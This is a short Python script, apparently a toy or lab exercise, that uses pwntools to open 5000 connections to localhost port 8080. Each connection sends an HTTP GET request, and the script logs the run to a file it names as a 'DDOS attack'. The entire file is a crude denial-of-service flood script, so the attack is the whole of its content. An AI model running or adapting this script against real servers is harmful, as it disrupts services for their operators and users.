from pwn import *


def ddos_attack(ip, port):
    for _ in range(5000):
        target = remote(ip, port)
        target.send(b"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n")
        target.close()

if __name__ == "__main__":
    ip = "localhost"
    port = 8080
    with open("attack.log", "+a") as f:
        f.write(f"DDOS attack over port {port} launched\n\n")
        f.close()
    ddos_attack(ip, port)   

    with open("attack.log", "+a") as f:
        f.write(f"DDOS attack over port {port} done\n\n")
        f.close() 
